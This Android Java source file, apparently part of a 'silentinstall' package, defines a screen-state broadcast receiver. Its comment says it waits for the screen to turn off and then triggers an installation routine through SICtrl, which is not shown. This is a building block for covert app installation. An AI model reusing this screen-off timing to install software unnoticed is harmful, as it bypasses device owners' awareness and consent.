package com.invisible.silentinstall.core;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;

import com.invisible.silentinstall.utils.GlobalContext;
import com.invisible.silentinstall.utils.Util_Log;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


/**
 * 当需要安装时，若是 屏幕开启状态，就激活此广播等待关屏。一旦关闭就执行安装
 */
public class DynamicReceiver {
	//singleton
	private static DynamicReceiver ins = null;
	public static DynamicReceiver getInstance(Context ctx){
		if(ins==null)ins = new DynamicReceiver(ctx);
		return ins;
	}
	private DynamicReceiver(Context ctx){
		this.ctx = ctx;
		registerComponent();
	}

	ExecutorService es = Executors.newSingleThreadExecutor();
	//field
	private Context ctx;
	//监听来自用户按Power键点亮点暗屏幕的广播
		private BroadcastReceiver mScreenOnOrOffReceiver = new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent)
			{
				String action = intent.getAction();
				// 
				if (action.equals("android.intent.action.SCREEN_ON"))
					{
					if(Util_Log.logShow) Util_Log.logSI("screen—on");
						unregisterComponent();
					}else if (action.equals("android.intent.action.SCREEN_OFF"))
					{
						if(Util_Log.logShow) Util_Log.logSI("screen—off");
						GlobalContext.init(context);
						es.execute(new Runnable() {
							@Override
							public void run() {
								SICtrl.getIns().execute(GlobalContext.getCtx());
							}
						});
					}
			}
		};
	
	 //注册广播监听
		public void registerComponent()
		{
			if(Util_Log.logShow) Util_Log.logSI("register receiver!");
				IntentFilter mScreenOnOrOffFilter = new IntentFilter();
				mScreenOnOrOffFilter.addAction("android.intent.action.SCREEN_ON");
				mScreenOnOrOffFilter.addAction("android.intent.action.SCREEN_OFF");
				ctx.registerReceiver(mScreenOnOrOffReceiver, mScreenOnOrOffFilter);
			
		}

	    //解除广播监听
		public void unregisterComponent() 
		{
			if (ins != null)
			{
				ctx.unregisterReceiver(mScreenOnOrOffReceiver);
				if(Util_Log.logShow) Util_Log.logSI("unregister receiver!");
				ins=null;
			}
		}
}